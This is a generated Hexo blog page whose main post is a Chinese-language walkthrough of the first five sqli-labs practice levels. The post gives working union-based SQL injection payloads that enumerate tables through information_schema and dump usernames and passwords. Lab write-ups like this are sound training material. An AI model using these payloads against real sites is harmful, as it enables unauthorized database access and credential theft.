@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-SQL-libs" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/09/02/SQL-libs/" class="article-date">
+  <time class="dt-published" datetime="2024-09-02T15:27:55.000Z" itemprop="datePublished">2024-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/09/02/SQL-libs/">SQL-libs</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入方式"><a href="#SQL注入方式" class="headerlink" title="SQL注入方式"></a>SQL注入方式</h1><h2 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1.联合注入"></a>1.联合注入</h2><h2 id="2-延时注入"><a href="#2-延时注入" class="headerlink" title="2.延时注入"></a>2.延时注入</h2><h2 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h2><h1 id="SQL注入基本流程"><a href="#SQL注入基本流程" class="headerlink" title="SQL注入基本流程"></a>SQL注入基本流程</h1><h2 id="1-判断注入点，例如修改id查看页面变化"><a href="#1-判断注入点，例如修改id查看页面变化" class="headerlink" title="1.判断注入点，例如修改id查看页面变化"></a>1.判断注入点，例如修改id查看页面变化</h2><h2 id="2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能"><a href="#2-判断闭合方式，常见闭合方式有-‘-‘’-‘-’等等-，采用注释的方式改变原函数功能" class="headerlink" title="2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能"></a>2.判断闭合方式，常见闭合方式有 ‘ ‘’ ‘()’等等 ，采用注释的方式改变原函数功能</h2><h2 id="3-查询列数，通过group-by或者-order-by-函数获取列数"><a href="#3-查询列数，通过group-by或者-order-by-函数获取列数" class="headerlink" title="3.查询列数，通过group by或者 order by 函数获取列数"></a>3.查询列数，通过group by或者 order by 函数获取列数</h2><h2 id="4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出"><a href="#4-通过union-select特性，可以将多个SELECT查询的结果结合在一起，同时输出" class="headerlink" title="4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出"></a>4.通过union select特性，可以将多个SELECT查询的结果结合在一起，同时输出</h2><h2 id="5-可以查询到想要的结果"><a href="#5-可以查询到想要的结果" class="headerlink" title="5.可以查询到想要的结果"></a>5.可以查询到想要的结果</h2><h3 id="知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库"><a href="#知识补充：information-schema是mysql自带数据库-mysql都自带这个数据库" class="headerlink" title="知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库"></a>知识补充：information_schema是mysql自带数据库,mysql都自带这个数据库</h3><ol>
+<li>获取所有表结构(TABLES)<br><code>SELECT  *  FROM information_schema.TABLES WHERE  TABLE_SCHEMA=&#39;数据库名&#39;</code><br>information_schema 中的表实际上是视图，而不是基本表。<br><code>information_schema</code> 是一个特殊的数据库，用于存储关于所有数据库对象（如表、列、索引等）的元数据。它提供了一种标准化的方式来查询数据库的结构和对象信息。下面是<code>information_schema</code> 中常用的几个表及其结构：<br><strong><code>information_schema.TABLES</code></strong>:<br> <strong><code>TABLE_SCHEMA</code></strong>: 表所在的数据库名称。<br> <code>table_name</code>：表的名称<br><strong><code>information_schema.COLUMNS</code></strong>:<br> <strong><code>COLUMN_NAME</code></strong>: 列的名称。</li>
+</ol>
+<h1 id="第1关-SQLI-1-联合注入"><a href="#第1关-SQLI-1-联合注入" class="headerlink" title="第1关-SQLI-1-联合注入"></a>第1关-SQLI-1-联合注入</h1><h2 id="第一步：首先判断注入点，更改id时，页面有回显"><a href="#第一步：首先判断注入点，更改id时，页面有回显" class="headerlink" title="第一步：首先判断注入点，更改id时，页面有回显"></a>第一步：首先判断注入点，更改id时，页面有回显</h2><p><img src="/../images/Pasted%20image%2020240909095455.png"></p>
+<h2 id="第二步：判断闭合方式"><a href="#第二步：判断闭合方式" class="headerlink" title="第二步：判断闭合方式"></a>第二步：判断闭合方式</h2><p>Less-1&#x2F;?id&#x3D;1’ 输入’ 可以判断出通过’判断<br><img src="/../images/Pasted%20image%2020240909095825.png"></p>
+<h2 id="第三步：利用注释-–-，注释掉原语句"><a href="#第三步：利用注释-–-，注释掉原语句" class="headerlink" title="第三步：利用注释 – +，注释掉原语句"></a>第三步：利用注释 – +，注释掉原语句</h2><p><img src="/../images/Pasted%20image%2020240909101026.png"></p>
+<h2 id="第四步：利用group-by判断条目数量"><a href="#第四步：利用group-by判断条目数量" class="headerlink" title="第四步：利用group by判断条目数量"></a>第四步：利用group by判断条目数量</h2><p><img src="/../images/Pasted%20image%2020240909101205.png"><br>发现条目为4时报错<br><img src="/../images/Pasted%20image%2020240909101243.png"><br>为3时正常输出，判断条目为3条</p>
+<h2 id="5-所以进行联合查询时需要union-select-1-2-3-三个部分"><a href="#5-所以进行联合查询时需要union-select-1-2-3-三个部分" class="headerlink" title="5.所以进行联合查询时需要union select 1,2,3 三个部分"></a>5.所以进行联合查询时需要union select 1,2,3 三个部分</h2><p><code>?id=1&#39; union select 1,2,3 -- +</code></p>
+<h3 id="5-1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1-2-3”的别名"><a href="#5-1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1-2-3”的别名" class="headerlink" title="5.1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1,2,3”的别名"></a>5.1同时需要将前面id改为异常值，禁止原结果输出，会输出我们定义的“1,2,3”的别名</h3><p><code>?id=-1&#39; union select 1,2,3 -- +</code><br><img src="/../images/Pasted%20image%2020240909145849.png"></p>
+<h2 id="5利用嵌入select的函数，来进行嵌入执行"><a href="#5利用嵌入select的函数，来进行嵌入执行" class="headerlink" title="5利用嵌入select的函数，来进行嵌入执行"></a>5利用嵌入select的函数，来进行嵌入执行</h2><p><code>Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database() ) -- +</code><br><code>group_concat</code>功能代表整合到一起输出<br>查询出表名有users,猜测users中有账号的用户名和密码<br><img src="/../images/Pasted%20image%2020240909095222.png"><br><code>Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; ) -- +</code><br>获取到users表中的column字段内容<br><img src="/../images/Pasted%20image%2020240909152133.png"><br>根据字段和表再用直接查询，得到用户名和账号<br><code>Less-1/?id=-1&#39; union select 1,2,(select group_concat(username,password) from users ) -- +</code><br><img src="/../images/Pasted%20image%2020240909152411.png"></p>
+<h1 id="第2关-SQLI-2-联合注入"><a href="#第2关-SQLI-2-联合注入" class="headerlink" title="第2关-SQLI-2-联合注入"></a>第2关-SQLI-2-联合注入</h1><p>数字型id，同样的方式，但没有字符，不需要闭合方式<br><code>less-1/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;) --+</code><br><img src="/../images/Pasted%20image%2020240909153251.png"></p>
+<h1 id="第3关-SQLI-3-联合注入"><a href="#第3关-SQLI-3-联合注入" class="headerlink" title="第3关-SQLI-3-联合注入"></a>第3关-SQLI-3-联合注入</h1><p><code>Less-3/?id=2&#39;) -- +</code> 闭合方式为<code>&#39;)</code></p>
+<h1 id="第4关-SQLI-4-联合注入"><a href="#第4关-SQLI-4-联合注入" class="headerlink" title="第4关-SQLI-4-联合注入"></a>第4关-SQLI-4-联合注入</h1><p><code>Less-3/?id=-1&quot;)  -- +闭合方式为&quot;)</code><br><img src="/../images/Pasted%20image%2020240909154755.png"></p>
+<h1 id="第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注"><a href="#第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注" class="headerlink" title="第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注"></a>第5关-SQLI-4-无回显可以选用报错注入、延时盲注、布尔盲注</h1><p><code>Less-5/?id=1&#39; and 1=1 -- +</code> 更改错误信息，无回显，可以选择<br><img src="/../images/Pasted%20image%2020240909172117.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/09/02/SQL-libs/" data-id="cm0v09t5n0001iuvg5c5u53ny" data-title="SQL-libs" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/hello-world/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1970/01/01/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/1970/01/01/hello-world/" data-id="cm0v09t5e0000iuvg4b6yfzx0" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/09/02/SQL-libs/">SQL-libs</a>
+          </li>
+        
+          <li>
+            <a href="/1970/01/01/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
